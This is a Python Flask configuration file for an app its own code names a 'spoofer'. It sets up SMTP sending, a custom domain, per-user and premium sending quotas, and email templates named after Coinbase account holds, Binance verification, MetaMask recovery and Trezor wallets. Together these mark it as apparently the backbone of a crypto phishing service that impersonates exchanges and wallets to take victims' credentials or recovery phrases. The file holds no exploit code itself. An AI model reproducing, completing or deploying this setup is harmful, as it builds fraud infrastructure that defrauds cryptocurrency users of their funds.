import os
from dotenv import load_dotenv
from pathlib import Path
from datetime import timedelta

# Load environment variables from .env file in the project root
env_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '.env')
load_dotenv(env_path)

# Project paths
PROJECT_ROOT = Path(__file__).resolve().parent.parent
LOG_FILE_PATH = PROJECT_ROOT / 'logs' / 'email_log.txt'
EMAIL_COUNT_FILE = PROJECT_ROOT / 'data' / 'email_counts.json'
GEOIP_DB_PATH = PROJECT_ROOT / 'data' / 'GeoLite2-City.mmdb'

# Security Configuration
SECURITY_CONFIG = {
    'password_min_length': int(os.getenv('PASSWORD_MIN_LENGTH', '12')),
    'password_require_uppercase': os.getenv('PASSWORD_REQUIRE_UPPERCASE', 'true').lower() == 'true',
    'password_require_lowercase': os.getenv('PASSWORD_REQUIRE_LOWERCASE', 'true').lower() == 'true',
    'password_require_numbers': os.getenv('PASSWORD_REQUIRE_NUMBERS', 'true').lower() == 'true',
    'password_require_special': os.getenv('PASSWORD_REQUIRE_SPECIAL', 'true').lower() == 'true',
    'session_lifetime': int(os.getenv('SESSION_LIFETIME_DAYS', '7')),
    'max_failed_logins': int(os.getenv('MAX_FAILED_LOGINS', '5')),
    'lockout_period': int(os.getenv('LOCKOUT_PERIOD_MINUTES', '30')),
    'enable_2fa': os.getenv('ENABLE_2FA', 'true').lower() == 'true',
    'jwt_expiration': int(os.getenv('JWT_EXPIRATION_MINUTES', '60')),
    'csrf_token_timeout': int(os.getenv('CSRF_TOKEN_TIMEOUT_MINUTES', '30'))
}

# SMTP Configuration
SMTP_CONFIG = {
    'host': os.getenv('SMTP_HOST', 'localhost'),
    'port': int(os.getenv('SMTP_PORT', '587')),
    'username': os.getenv('SMTP_USERNAME', ''),
    'password': os.getenv('SMTP_PASSWORD', ''),
    'use_tls': os.getenv('SMTP_USE_TLS', 'true').lower() == 'true',
    'use_ssl': os.getenv('SMTP_USE_SSL', 'false').lower() == 'true',
    'timeout': int(os.getenv('SMTP_TIMEOUT', '30')),
    'from_email': os.getenv('SMTP_FROM_EMAIL', ''),
    'reply_to': os.getenv('SMTP_REPLY_TO', ''),
    'domain': os.getenv('SMTP_DOMAIN', 'localhost')
}

# HTML Templates
HTML_TEMPLATES = {
    'coinbase_hold': os.getenv('COINBASE_TEMPLATE', ''),
    'binance_verify': os.getenv('BINANCE_TEMPLATE', ''),
    'metamask_recovery': os.getenv('METAMASK_TEMPLATE', ''),
    'trezor_wallet': os.getenv('TREZOR_TEMPLATE', '')
}

# Email Limits
MAX_EMAILS_PER_HOUR = int(os.getenv('MAX_EMAILS_PER_HOUR', '10'))
MAX_EMAILS_PER_DAY = int(os.getenv('MAX_EMAILS_PER_DAY', '50'))

# Domain Configuration
DOMAIN = os.getenv('DOMAIN')  # Your Namecheap domain
DOMAIN_SCHEME = os.getenv('DOMAIN_SCHEME', 'http')

# Database Configuration
SQLALCHEMY_DATABASE_URI = os.getenv('DATABASE_URL', 'sqlite:///spoofer.db')
SQLALCHEMY_TRACK_MODIFICATIONS = False

# Rate Limits Configuration
RATE_LIMITS = {
    'user': {
        'hourly': int(os.getenv('USER_HOURLY_LIMIT', '10')),
        'daily': int(os.getenv('USER_DAILY_LIMIT', '50')),
        'concurrent': int(os.getenv('USER_CONCURRENT_LIMIT', '2')),
        'api_rate': os.getenv('USER_API_RATE', '100/hour')
    },
    'premium': {
        'hourly': int(os.getenv('PREMIUM_HOURLY_LIMIT', '50')),
        'daily': int(os.getenv('PREMIUM_DAILY_LIMIT', '200')),
        'concurrent': int(os.getenv('PREMIUM_CONCURRENT_LIMIT', '5')),
        'api_rate': os.getenv('PREMIUM_API_RATE', '1000/hour')
    },
    'admin': {
        'hourly': int(os.getenv('ADMIN_HOURLY_LIMIT', '100')),
        'daily': int(os.getenv('ADMIN_DAILY_LIMIT', '500')),
        'concurrent': int(os.getenv('ADMIN_CONCURRENT_LIMIT', '10')),
        'api_rate': os.getenv('ADMIN_API_RATE', '5000/hour')
    }
}

# Redis Configuration
REDIS_CONFIG = {
    'host': os.getenv('REDIS_HOST', 'localhost'),
    'port': int(os.getenv('REDIS_PORT', '6379')),
    'decode_responses': True,
    'username': os.getenv('REDIS_USERNAME', 'default'),
    'password': os.getenv('REDIS_PASSWORD'),
    'db': int(os.getenv('REDIS_DB', '0')),
    'retry_on_timeout': True,
    'socket_timeout': int(os.getenv('REDIS_SOCKET_TIMEOUT', '10')),
    'ssl': os.getenv('REDIS_SSL', 'False').lower() == 'true',
    'ssl_cert_reqs': None if os.getenv('REDIS_SSL_VERIFY', 'False').lower() == 'false' else 'required'
}

# Construct Redis URL from config
REDIS_URL = f"redis://{':' + REDIS_CONFIG['password'] + '@' if REDIS_CONFIG['password'] else ''}{REDIS_CONFIG['host']}:{REDIS_CONFIG['port']}/{REDIS_CONFIG['db']}"

# Monitoring Configuration
MONITORING_CONFIG = {
    'enable_prometheus': os.getenv('ENABLE_PROMETHEUS', 'true').lower() == 'true',
    'prometheus_port': int(os.getenv('PROMETHEUS_PORT', '9090')),
    'enable_sentry': os.getenv('ENABLE_SENTRY', 'false').lower() == 'true',
    'sentry_dsn': os.getenv('SENTRY_DSN', ''),
    'statsd_host': os.getenv('STATSD_HOST', 'localhost'),
    'statsd_port': int(os.getenv('STATSD_PORT', '8125')),
    'log_level': os.getenv('LOG_LEVEL', 'INFO'),
    'enable_request_logging': os.getenv('ENABLE_REQUEST_LOGGING', 'true').lower() == 'true'
}

class Config:
    """Application configuration class"""
    
    # Flask Configuration
    SECRET_KEY = os.getenv('SECRET_KEY')
    if not SECRET_KEY:
        # Generate a secure random key for development
        import secrets
        SECRET_KEY = secrets.token_hex(32)
        
    # CSRF Configuration
    WTF_CSRF_SECRET_KEY = SECRET_KEY  # Use same secret key for CSRF
    WTF_CSRF_ENABLED = os.getenv('CSRF_ENABLED', 'True').lower() == 'true'
    WTF_CSRF_TIME_LIMIT = int(os.getenv('CSRF_TIME_LIMIT', '3600'))
    WTF_CSRF_SSL_STRICT = os.getenv('CSRF_SSL_STRICT', 'True').lower() == 'true'
    
    # Debug and Testing
    DEBUG = os.getenv('DEBUG', 'False').lower() == 'true'
    TESTING = os.getenv('TESTING', 'False').lower() == 'true'
    
    # Domain Configuration
    SERVER_NAME = os.getenv('DOMAIN', 'localhost')
    PREFERRED_URL_SCHEME = os.getenv('DOMAIN_SCHEME', 'https')
    APP_URL = f"{PREFERRED_URL_SCHEME}://{SERVER_NAME}"
    
    # Database Configuration
    SQLALCHEMY_DATABASE_URI = SQLALCHEMY_DATABASE_URI
    SQLALCHEMY_TRACK_MODIFICATIONS = SQLALCHEMY_TRACK_MODIFICATIONS
    SQLALCHEMY_ENGINE_OPTIONS = {
        'pool_size': int(os.getenv('DB_POOL_SIZE', '20')),
        'max_overflow': int(os.getenv('DB_MAX_OVERFLOW', '40')),
        'pool_pre_ping': True,
        'pool_recycle': 300,
        'pool_timeout': 20
    }
    
    # Session Configuration
    SESSION_TYPE = 'redis' if REDIS_CONFIG['host'] != 'localhost' else 'filesystem'
    PERMANENT_SESSION_LIFETIME = timedelta(days=SECURITY_CONFIG['session_lifetime'])
    SESSION_COOKIE_SECURE = PREFERRED_URL_SCHEME == 'https'
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = 'Lax'
    
    # Security Configuration
    SECURITY_CONFIG = SECURITY_CONFIG
    
    # Email Configuration
    SMTP_HOST = SMTP_CONFIG['host']
    SMTP_PORT = SMTP_CONFIG['port']
    SMTP_USER = SMTP_CONFIG['username']
    SMTP_PASS = SMTP_CONFIG['password']
    SMTP_USE_TLS = SMTP_CONFIG['use_tls']
    SMTP_USE_SSL = SMTP_CONFIG['use_ssl']
    SMTP_TIMEOUT = SMTP_CONFIG['timeout']
    SMTP_FROM_EMAIL = SMTP_CONFIG['from_email']
    SMTP_REPLY_TO = SMTP_CONFIG['reply_to']
    SMTP_DOMAIN = SMTP_CONFIG['domain']
    
    # Rate Limiting Configuration
    RATE_LIMITS = RATE_LIMITS
    
    # Redis Configuration
    REDIS_CONFIG = REDIS_CONFIG
    
    # Redis URL (for Flask-Limiter)
    REDIS_URL = REDIS_URL
    
    # Monitoring Configuration
    MONITORING_CONFIG = MONITORING_CONFIG
    
    # Feature Flags
    ENABLE_EMAIL_TRACKING = os.getenv('ENABLE_EMAIL_TRACKING', 'true').lower() == 'true'
    ENABLE_SPAM_CHECK = os.getenv('ENABLE_SPAM_CHECK', 'true').lower() == 'true'
    ENABLE_RATE_LIMITING = os.getenv('ENABLE_RATE_LIMITING', 'true').lower() == 'true'
    ENABLE_IP_BLOCKING = os.getenv('ENABLE_IP_BLOCKING', 'true').lower() == 'true'
    
    # Registration Rate Limits
    REGISTRATION_LIMITS = {
        'hourly_per_ip': int(os.getenv('REGISTRATION_HOURLY_PER_IP', '3')),
        'daily_per_ip': int(os.getenv('REGISTRATION_DAILY_PER_IP', '5')),
        'monthly_per_ip': int(os.getenv('REGISTRATION_MONTHLY_PER_IP', '10')),
        'daily_per_browser': int(os.getenv('REGISTRATION_DAILY_PER_BROWSER', '2'))
    }

    # API Rate Limits
    API_RATE_LIMITS = {
        'user': {
            'hourly': int(os.getenv('API_RATE_LIMIT_USER_HOURLY', '20')),
            'daily': int(os.getenv('API_RATE_LIMIT_USER_DAILY', '100')),
            'concurrent': int(os.getenv('API_RATE_LIMIT_USER_CONCURRENT', '2'))
        },
        'premium': {
            'hourly': int(os.getenv('API_RATE_LIMIT_PREMIUM_HOURLY', '50')),
            'daily': int(os.getenv('API_RATE_LIMIT_PREMIUM_DAILY', '200')),
            'concurrent': int(os.getenv('API_RATE_LIMIT_PREMIUM_CONCURRENT', '5'))
        },
        'admin': {
            'hourly': int(os.getenv('API_RATE_LIMIT_ADMIN_HOURLY', '1000')),
            'daily': int(os.getenv('API_RATE_LIMIT_ADMIN_DAILY', '5000')),
            'concurrent': int(os.getenv('API_RATE_LIMIT_ADMIN_CONCURRENT', '10'))
        }
    }

    # Authentication Rate Limits
    AUTH_RATE_LIMITS = {
        'max_attempts': int(os.getenv('AUTH_MAX_ATTEMPTS', '5')),
        'lockout_duration': int(os.getenv('AUTH_LOCKOUT_DURATION', '900')),
        'attempt_window': int(os.getenv('AUTH_ATTEMPT_WINDOW', '3600'))
    }

    # Admin Account
    ADMIN_CONFIG = {
        'username': os.getenv('ADMIN_USERNAME', 'admin'),
        'password': os.getenv('ADMIN_PASSWORD', 'change-this-password')
    }

    @classmethod
    def get_rate_limits(cls, role):
        """Get rate limits based on user role"""
        return cls.API_RATE_LIMITS.get(role, cls.API_RATE_LIMITS['user'])
        
    @staticmethod
    def init_app(app):
        """Initialize application with configuration"""
        # Set up Sentry if enabled
        if Config.MONITORING_CONFIG['enable_sentry']:
            import sentry_sdk
            from sentry_sdk.integrations.flask import FlaskIntegration
            
            sentry_sdk.init(
                dsn=Config.MONITORING_CONFIG['sentry_dsn'],
                integrations=[FlaskIntegration()],
                traces_sample_rate=1.0
            )
        
        # Set up StatsD if configured
        if Config.MONITORING_CONFIG['statsd_host']:
            from statsd import StatsClient
            app.statsd = StatsClient(
                host=Config.MONITORING_CONFIG['statsd_host'],
                port=Config.MONITORING_CONFIG['statsd_port']
            )
        
        # Set up Prometheus if enabled
        if Config.MONITORING_CONFIG['enable_prometheus']:
            from prometheus_client import make_wsgi_app
            from werkzeug.middleware.dispatcher import DispatcherMiddleware
            
            app.wsgi_app = DispatcherMiddleware(app.wsgi_app, {
                '/metrics': make_wsgi_app()
            })

def update_email_limits(per_hour=None, per_day=None):
    global MAX_EMAILS_PER_HOUR, MAX_EMAILS_PER_DAY
    if per_hour is not None:
        MAX_EMAILS_PER_HOUR = per_hour
        Config.MAX_EMAILS_PER_HOUR = per_hour
    if per_day is not None:
        MAX_EMAILS_PER_DAY = per_day
        Config.MAX_EMAILS_PER_DAY = per_day

class DevelopmentConfig(Config):
    DEBUG = True
    SQLALCHEMY_ECHO = True

class TestingConfig(Config):
    TESTING = True
    SQLALCHEMY_DATABASE_URI = 'sqlite:///:memory:'
    WTF_CSRF_ENABLED = False

class ProductionConfig(Config):
    DEBUG = False
    TESTING = False
    SQLALCHEMY_ECHO = False
    SESSION_COOKIE_SECURE = True

    def __init__(self):
        if not self.SECRET_KEY or self.SECRET_KEY == 'default-dev-key-change-in-production':
            raise ValueError("Production SECRET_KEY must be set in environment") 